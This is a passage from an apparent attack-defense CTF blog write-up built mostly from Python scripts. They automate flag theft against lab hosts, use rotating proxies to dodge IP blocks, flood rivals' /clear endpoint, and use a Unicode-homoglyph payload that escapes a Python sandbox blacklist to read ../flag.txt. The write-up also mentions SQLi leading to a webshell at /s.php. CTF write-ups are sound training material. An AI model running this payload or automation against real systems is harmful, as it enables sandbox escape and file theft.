<span class="comment"># test_proxies()</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Proxy mode: DISABLED&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Press Ctrl+C to stop\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    iteration = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            timestamp = datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[Iteration <span class="subst">&#123;iteration&#125;</span>] - <span class="subst">&#123;timestamp&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">70</span>)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Extracting flags...&quot;</span>)</span><br><span class="line">            flags = get_flags()</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[*] Found <span class="subst">&#123;<span class="built_in">len</span>(flags)&#125;</span> flags&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> flags:</span><br><span class="line">                submit_flags(flags)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  [!] No flags collected this round&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[*] Waiting <span class="subst">&#123;INTERVAL&#125;</span> seconds until next run...&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line"></span><br><span class="line">            time.sleep(INTERVAL)</span><br><span class="line">            iteration += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n\n[!] Stopped by user&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[-] Error in main loop: <span class="subst">&#123;<span class="built_in">type</span>(e).__name__&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Retrying in <span class="subst">&#123;INTERVAL&#125;</span> seconds...&quot;</span>)</span><br><span class="line">            time.sleep(INTERVAL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>if you noticed we added proxy feature cuz some of the other teams decided to filter our ip address from visiting their website.</p>
<p>u one cheeky bastard @vicevirus.</p>
<p>oh and also since the flag were shown in the output of the page, we decided to keep on sending request to clear the flag by sending request to the clear endpoint continously</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># Configuration</span></span><br><span class="line">PORT = <span class="number">16000</span></span><br><span class="line">HOSTS = [<span class="string">f&quot;10.10.<span class="subst">&#123;i&#125;</span>.10&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>)]  <span class="comment"># 10.10.1.10 through 10.10.5.10</span></span><br><span class="line">ENDPOINT = <span class="string">&quot;/clear&quot;</span></span><br><span class="line">INTERVAL = <span class="number">1</span>  <span class="comment"># seconds</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Headers from your request</span></span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en-US,en;q=0.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>: <span class="string">f&quot;http://10.10.1.10:<span class="subst">&#123;PORT&#125;</span>&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>: <span class="string">f&quot;http://10.10.1.10:<span class="subst">&#123;PORT&#125;</span>/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Priority&quot;</span>: <span class="string">&quot;u=0, i&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_clear_request</span>(<span class="params">host</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Send POST request to /clear endpoint&quot;&quot;&quot;</span></span><br><span class="line">    url = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;PORT&#125;</span><span class="subst">&#123;ENDPOINT&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, headers=HEADERS, timeout=<span class="number">5</span>)</span><br><span class="line">        timestamp = datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;timestamp&#125;</span>] <span class="subst">&#123;host&#125;</span> - Status: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        timestamp = datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;timestamp&#125;</span>] <span class="subst">&#123;host&#125;</span> - Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Starting clear endpoint automation...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Targets: <span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(HOSTS)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Interval: <span class="subst">&#123;INTERVAL&#125;</span> second(s)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Press Ctrl+C to stop\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> host <span class="keyword">in</span> HOSTS:</span><br><span class="line">                send_clear_request(host)</span><br><span class="line">            time.sleep(INTERVAL)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n\nStopped by user&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h1 id="Calculator-Port-4000"><a href="#Calculator-Port-4000" class="headerlink" title="Calculator Port 4000"></a>Calculator Port 4000</h1><p>i think this is pyjail challenge, we can bypass the blacklist filter using unicode homoglyphs.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">fetch_flags_loop_unicode.py</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Continuously (every 2 minutes) connect to each target host:port, send the exact</span></span><br><span class="line"><span class="string">Unicode expression provided by the user, parse the returned flag line, and append</span></span><br><span class="line"><span class="string">each result (with timestamp + host) to flags.log. Then submits all collected flags.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">    python3 fetch_flags_loop_unicode.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Configuration</span></span><br><span class="line">HOSTS = [</span><br><span class="line">    <span class="string">&quot;10.10.1.10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;10.10.2.10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;10.10.3.10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;10.10.5.10&quot;</span>,</span><br><span class="line">]</span><br><span class="line">PORT = <span class="number">4000</span></span><br><span class="line">SOCKET_TIMEOUT = <span class="number">8</span>  <span class="comment"># seconds for connect/read operations</span></span><br><span class="line">SLEEP_SECS = <span class="number">2</span> * <span class="number">60</span>  <span class="comment"># 2 minutes</span></span><br><span class="line">LOGFILE = <span class="string">&quot;flags.log&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Submission configuration</span></span><br><span class="line">SUBMIT_HOST = <span class="string">&quot;10.10.100.10&quot;</span>  <span class="comment"># *** CHANGE THIS to your submission server</span></span><br><span class="line">SUBMIT_PORT = <span class="number">6666</span>         <span class="comment"># *** CHANGE THIS to your submission port</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># *** The user-required expression (exactly as provided) ***</span></span><br><span class="line">EXPRESSION = <span class="string">r&#x27;𝘰𝘱𝘦𝘯(&quot;\056\056\057\146\154\141\147\056\164\170\164&quot;).𝘳𝘦𝘢𝘥()&#x27;</span></span><br><span class="line"><span class="comment"># we&#x27;ll send a newline after it so the remote prompt processes it</span></span><br><span class="line">EXPRESSION_TO_SEND = EXPRESSION + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Regex to extract the flag from the returned text. Example lines:</span></span><br><span class="line"><span class="comment"># Result: Flag for 54 is SIBER25_Q1RGLS+...</span></span><br><span class="line">FLAG_RE = re.<span class="built_in">compile</span>(<span class="string">r&#x27;Flag for \d+ is (\S+)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">running = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_sigint</span>(<span class="params">signum, frame</span>):</span><br><span class="line">    <span class="keyword">global</span> running</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nReceived interrupt, stopping gracefully...&quot;</span>)</span><br><span class="line">    running = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGINT, handle_sigint)</span><br><span class="line">signal.signal(signal.SIGTERM, handle_sigint)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_flag_from</span>(<span class="params">host, port=PORT</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Connects to host:port, waits for banner/prompt, sends EXPRESSION_TO_SEND,</span></span><br><span class="line"><span class="string">    reads response and returns (flag_or_none, raw_text).</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> socket.create_connection((host, port), timeout=SOCKET_TIMEOUT) <span class="keyword">as</span> s:</span><br><span class="line">            s.settimeout(SOCKET_TIMEOUT)</span><br><span class="line">            <span class="comment"># read initial banner until prompt or timeout</span></span><br><span class="line">            banner = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    chunk = s.recv(<span class="number">4096</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    banner += chunk</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">b&#x27;Expression&#x27;</span> <span class="keyword">in</span> banner <span class="keyword">or</span> <span class="string">b&#x27;Expression &gt;&#x27;</span> <span class="keyword">in</span> banner:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> socket.timeout:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># send the exact unicode expression</span></span><br><span class="line">            s.sendall(EXPRESSION_TO_SEND.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># read response (a few KB is usually enough)</span></span><br><span class="line">            resp = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    chunk = s.recv(<span class="number">4096</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    resp += chunk</span><br><span class="line">                    <span class="comment"># simple heuristic: stop after we&#x27;ve seen &quot;Result:&quot; and a newline</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">b&#x27;Result:&#x27;</span> <span class="keyword">in</span> resp <span class="keyword">and</span> <span class="string">b&#x27;\n&#x27;</span> <span class="keyword">in</span> resp.split(<span class="string">b&#x27;Result:&#x27;</span>,<span class="number">1</span>)[<span class="number">1</span>]:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> socket.timeout:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">            text = (banner + resp).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line">            m = FLAG_RE.search(text)</span><br><span class="line">            <span class="keyword">if</span> m:</span><br><span class="line">                <span class="keyword">return</span> m.group(<span class="number">1</span>), text</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># fallback: capture whatever follows &quot;Result:&quot; if present</span></span><br><span class="line">                alt_match = re.search(<span class="string">r&#x27;Result:\s*(.+)&#x27;</span>, text)</span><br><span class="line">                <span class="keyword">if</span> alt_match:</span><br><span class="line">                    alt = alt_match.group(<span class="number">1</span>).strip().splitlines()[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">return</span> alt, text</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span>, text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="string">f&quot;ERROR: <span class="subst">&#123;e&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_result</span>(<span class="params">host, flag, raw</span>):</span><br><span class="line">    ts = datetime.datetime.utcnow().isoformat() + <span class="string">&quot;Z&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(LOGFILE, <span class="string">&quot;a&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">f&quot;<span class="subst">&#123;ts&#125;</span> <span class="subst">&#123;host&#125;</span> <span class="subst">&#123;flag&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">f&quot;<span class="subst">&#123;ts&#125;</span> <span class="subst">&#123;host&#125;</span> RAW:\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> raw.splitlines():</span><br><span class="line">            f.write(<span class="string">f&quot;<span class="subst">&#123;ts&#125;</span> <span class="subst">&#123;host&#125;</span> RAW: <span class="subst">&#123;line&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flags</span>(<span class="params">flags</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Submit flags to the server&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flags:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; [-] No flags to submit!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot; [*] Connecting to <span class="subst">&#123;SUBMIT_HOST&#125;</span>:<span class="subst">&#123;SUBMIT_PORT&#125;</span>...&quot;</span>)</span><br><span class="line">        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(<span class="number">10</span>)</span><br><span class="line">        sock.connect((SUBMIT_HOST, SUBMIT_PORT))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read banner</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            banner = sock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot; <span class="subst">&#123;banner.strip()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; [*] Submitting flags...\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">            sock.sendall(flag.encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = sock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot; <span class="subst">&#123;flag&#125;</span> -&gt; <span class="subst">&#123;response.strip()&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot; <span class="subst">&#123;flag&#125;</span> -&gt; No response&quot;</span>)</span><br><span class="line"></span><br><span class="line">        sock.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot; [-] Error submitting: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_loop</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Starting flag fetch loop. Hosts: <span class="subst">&#123;HOSTS&#125;</span>. Poll every <span class="subst">&#123;SLEEP_SECS&#125;</span> seconds.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Will submit to <span class="subst">&#123;SUBMIT_HOST&#125;</span>:<span class="subst">&#123;SUBMIT_PORT&#125;</span>\n&quot;</span>)</span><br><span class="line">    iteration = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> running:</span><br><span class="line">        iteration += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">60</span>&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Iteration #<span class="subst">&#123;iteration&#125;</span> - <span class="subst">&#123;datetime.datetime.now().isoformat()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;=&#x27;</span>*<span class="number">60</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        collected_flags = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> host <span class="keyword">in</span> HOSTS:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> running:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  -&gt; Connecting to <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;PORT&#125;</span> ...&quot;</span>, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            flag, raw = fetch_flag_from(host, PORT)</span><br><span class="line">            <span class="keyword">if</span> flag <span class="keyword">and</span> flag != <span class="string">&quot;&lt;no-flag&gt;&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot; FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                log_result(host, flag, raw <span class="keyword">if</span> raw <span class="keyword">else</span> <span class="string">&quot;&lt;no raw&gt;&quot;</span>)</span><br><span class="line">                collected_flags.append(flag)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot; no flag found / error&quot;</span>)</span><br><span class="line">                log_result(host, <span class="string">&quot;&lt;no-flag&gt;&quot;</span>, raw <span class="keyword">if</span> raw <span class="keyword">else</span> <span class="string">&quot;&lt;no raw&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Submit all collected flags</span></span><br><span class="line">        <span class="keyword">if</span> collected_flags:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n [+] Collected <span class="subst">&#123;<span class="built_in">len</span>(collected_flags)&#125;</span> flag(s)&quot;</span>)</span><br><span class="line">            submit_flags(collected_flags)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n [-] No flags collected this iteration&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> running:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># sleep with graceful-shutdown checks</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n [*] Sleeping for <span class="subst">&#123;SLEEP_SECS&#125;</span> seconds...&quot;</span>)</span><br><span class="line">        slept = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> slept &lt; SLEEP_SECS <span class="keyword">and</span> running:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            slept += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nExited loop. Goodbye.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main_loop()</span><br></pre></td></tr></table></figure>

<h1 id="Appetizer-Port-5555"><a href="#Appetizer-Port-5555" class="headerlink" title="Appetizer Port 5555"></a>Appetizer Port 5555</h1><p>based from my understanding i believe that it is related to sqli, which you can upload a webshell, which eventually leads to rce.</p>
<p>we didn’t solve it the intended way but we saw someone left his trail in one of the services so we take a look at the webhook and turns out it shows that the webshell is at &#x2F;s.php lol</p>
<p><img src="/images/ihack/bruhhhhh.png" alt="j"></p>
